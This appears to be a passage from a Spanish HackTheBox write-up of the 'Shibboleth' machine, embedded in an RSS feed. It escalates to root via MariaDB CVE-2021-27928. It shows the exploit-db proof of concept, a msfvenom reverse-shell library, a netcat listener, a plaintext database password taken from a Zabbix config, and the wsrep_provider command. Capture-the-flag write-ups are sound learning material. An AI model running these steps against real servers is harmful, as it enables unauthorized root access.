&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/shibboleth ‚ùØ searchsploit mariadb
----------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                               &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  Path
----------------------------------------------------------------------------- ---------------------------------
MariaDB 10.2 /MySQL - &lt;span class=&#34;s1&#34;&gt;&amp;#39;wsrep_provider&amp;#39;&lt;/span&gt; OS Command Execution                  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; linux/local/49765.txt
MariaDB Client 10.1.26 - Denial of Service &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PoC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;                             &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; linux/dos/45901.txt
MySQL / MariaDB - Geometry Query Denial of Service                           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; linux/dos/38392.txt
MySQL / MariaDB / PerconaDB 5.5.51/5.6.32/5.7.14 - Code Execution / Privileg &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; linux/local/40360.txt
MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - &lt;span class=&#34;s1&#34;&gt;&amp;#39;mysql&amp;#39;&lt;/span&gt; System User Privileg &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; linux/local/40678.c
MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - &lt;span class=&#34;s1&#34;&gt;&amp;#39;root&amp;#39;&lt;/span&gt; System User Privilege &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; linux/local/40679.sh
Oracle MySQL / MariaDB - Insecure Salt Generation Security Bypass            &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; linux/remote/38109.pl
----------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
 œÄ ~/htb/shibboleth ‚ùØ searchsploit -m linux/local/49765.txt
  Exploit: MariaDB 10.2 /MySQL - &lt;span class=&#34;s1&#34;&gt;&amp;#39;wsrep_provider&amp;#39;&lt;/span&gt; OS Command Execution
      URL: https://www.exploit-db.com/exploits/49765
     Path: /usr/share/exploitdb/exploits/linux/local/49765.txt
File Type: ASCII text, with CRLF line terminators

Copied to: /home/kali/htb/shibboleth/49765.txt

 œÄ ~/htb/shibboleth ‚ùØ cat 49765.txt
&lt;span class=&#34;c1&#34;&gt;# Exploit Title: MariaDB 10.2 /MySQL - &amp;#39;wsrep_provider&amp;#39; OS Command Execution&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# Date: 03/18/2021&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# Exploit Author: Central InfoSec&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# Version: MariaDB 10.2 before 10.2.37, 10.3 before 10.3.28, 10.4 before 10.4.18, and 10.5 before 10.5.9; Percona Server through 2021-03-03; and the wsrep patch through 2021-03-03 for MySQL&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# Tested on: Linux&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# CVE : CVE-2021-27928&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# Proof of Concept:&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# Create the reverse shell payload&lt;/span&gt;
msfvenom -p linux/x64/shell_reverse_tcp &lt;span class=&#34;nv&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;lt;ip&amp;gt; &lt;span class=&#34;nv&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;lt;port&amp;gt; -f elf-so -o CVE-2021-27928.so

&lt;span class=&#34;c1&#34;&gt;# Start a listener&lt;/span&gt;
nc -lvp &amp;lt;port&amp;gt;

&lt;span class=&#34;c1&#34;&gt;# Copy the payload to the target machine (In this example, SCP/SSH is used)&lt;/span&gt;
scp CVE-2021-27928.so &amp;lt;user&amp;gt;@&amp;lt;ip&amp;gt;:/tmp/CVE-2021-27928.so

&lt;span class=&#34;c1&#34;&gt;# Execute the payload&lt;/span&gt;
 œÄ ~/htb/shibboleth ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Aun asi necesita de credenciales de acceso para mysql para ejecutar comandos - &lt;a href=&#34;https://github.com/Al1ex/CVE-2021-27928&#34;&gt;CVE-2021-27928&lt;/a&gt;. Tras realizar una busqueda de credenciales vemos en el archivo de configuracion de Zabbix unas credenciales de acceso.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ipmi-svc@shibboleth:/etc/zabbix$
ls -lah
ls -lah
total 100K
drwxr-xr-x  &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; root     root     4.0K Nov  &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; 11:02 .
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;96&lt;/span&gt; root     root     4.0K Nov  &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; 11:02 ..
-r--------  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; zabbix   zabbix     &lt;span class=&#34;m&#34;&gt;33&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;24&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; peeesskay.psk
drwxr-xr-x  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; www-data root     4.0K Apr &lt;span class=&#34;m&#34;&gt;27&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; web
-rw-r--r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root     root      15K May &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 08:27 zabbix_agentd.conf
-rw-r--r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root     root      16K Oct &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 09:24 zabbix_agentd.conf.dpkg-dist
drwxr-xr-x  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; root     root     4.0K Apr &lt;span class=&#34;m&#34;&gt;27&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; zabbix_agentd.d
-rw-r-----  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root     ipmi-svc  22K Apr &lt;span class=&#34;m&#34;&gt;24&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; zabbix_server.conf
-rw-r-----  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root     ipmi-svc  22K Oct &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 09:24 zabbix_server.conf.dpkg-dist
ipmi-svc@shibboleth:/etc/zabbix$ cat zabbix_server.conf&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep -v &lt;span class=&#34;s2&#34;&gt;&amp;#34;#&amp;#34;&lt;/span&gt;

&lt;span class=&#34;nv&#34;&gt;LogFile&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/var/log/zabbix/zabbix_server.log

&lt;span class=&#34;nv&#34;&gt;LogFileSize&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;

&lt;span class=&#34;nv&#34;&gt;PidFile&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/run/zabbix/zabbix_server.pid

&lt;span class=&#34;nv&#34;&gt;SocketDir&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/run/zabbix

&lt;span class=&#34;nv&#34;&gt;DBName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;zabbix

&lt;span class=&#34;nv&#34;&gt;DBUser&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;zabbix

&lt;span class=&#34;nv&#34;&gt;DBPassword&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;bloooarskybluh
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;exploit&#34;&gt;Exploit&lt;/h2&gt;
&lt;p&gt;Siguiendo los pasos de la &lt;a href=&#34;https://github.com/Al1ex/CVE-2021-27928#how-to-exploit&#34;&gt;Explotacion&lt;/a&gt; creamos el payload utilizando msfvenom.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/shibboleth ‚ùØ msfvenom -p linux/x64/shell_reverse_tcp &lt;span class=&#34;nv&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;tun0 &lt;span class=&#34;nv&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1335&lt;/span&gt; -f elf-so -o cve.so
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; No platform was selected, choosing Msf::Module::Platform::Linux from the payload
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: &lt;span class=&#34;m&#34;&gt;74&lt;/span&gt; bytes
Final size of elf-so file: &lt;span class=&#34;m&#34;&gt;476&lt;/span&gt; bytes
Saved as: cve.so
 œÄ ~/htb/shibboleth ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Descargamos el payload en la maquina con &lt;code&gt;wget&lt;/code&gt; y ejecutamos netcat a la escucha en el puerto 1335.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ipmi-svc@shibboleth:/tmp$ ls cve.so
cve.so
ipmi-svc@shibboleth:/tmp$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ingresamos a Mysql con las credenciales y actualizamos la variable &lt;code&gt;wsrep_provider&lt;/code&gt; a nuestro payload.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ipmi-svc@shibboleth:/tmp$ mysql -u zabbix -p
Password: bloooarskybluh

Welcome to the MariaDB monitor.  Commands end with &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; or &lt;span class=&#34;se&#34;&gt;\g&lt;/span&gt;.
Your MariaDB connection id is &lt;span class=&#34;m&#34;&gt;1082&lt;/span&gt;
Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type &lt;span class=&#34;s1&#34;&gt;&amp;#39;help;&amp;#39;&lt;/span&gt; or &lt;span class=&#34;s1&#34;&gt;&amp;#39;\h&amp;#39;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; help. Type &lt;span class=&#34;s1&#34;&gt;&amp;#39;\c&amp;#39;&lt;/span&gt; to clear the current input statement.

MariaDB &lt;span class=&#34;o&#34;&gt;[(&lt;/span&gt;none&lt;span class=&#34;o&#34;&gt;)]&lt;/span&gt;&amp;gt; SET GLOBAL &lt;span class=&#34;nv&#34;&gt;wsrep_provider&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/tmp/cve.so&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
ERROR &lt;span class=&#34;m&#34;&gt;2013&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HY000&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: Lost connection to MySQL server during query
MariaDB &lt;span class=&#34;o&#34;&gt;[(&lt;/span&gt;none&lt;span class=&#34;o&#34;&gt;)]&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;shell-1&#34;&gt;Shell&lt;/h2&gt;
&lt;p&gt;Luego de ello obtuvimos una shell como usuario root y nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/shibboleth ‚ùØ rlwrap nc -lvp &lt;span class=&#34;m&#34;&gt;1335&lt;/span&gt;
listening on &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;any&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1335&lt;/span&gt; ...
connect to &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.14.30&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; from shibboleth.htb &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.11.124&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;53148&lt;/span&gt;
python3 -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;import pty;pty.spawn(&amp;#34;/bin/bash&amp;#34;);&amp;#39;&lt;/span&gt;
root@shibboleth:/var/lib/mysql# whoami&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; id
root
&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
root@shibboleth:/var/lib/mysql# &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /root
root@shibboleth:/var/lib/mysql# ls
root.txt  scripts
root@shibboleth:/root# cat root.txt
f7b3b5b6e4e21c5fd57b6f0195ecfef4
root@shibboleth:/root#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/shibboleth/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/shibboleth/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>zabbix</category>
            
          
            
              <category>ipmi</category>
            
          
            
              <category>ffuf</category>
            
          
            
              <category>metasploit</category>
            
          
            
              <category>mySQL</category>
            
          
            
              <category>CVE-2021-27928</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>linux</category>
            
          
        
        
      </item>
      

    
  </channel>
</rss>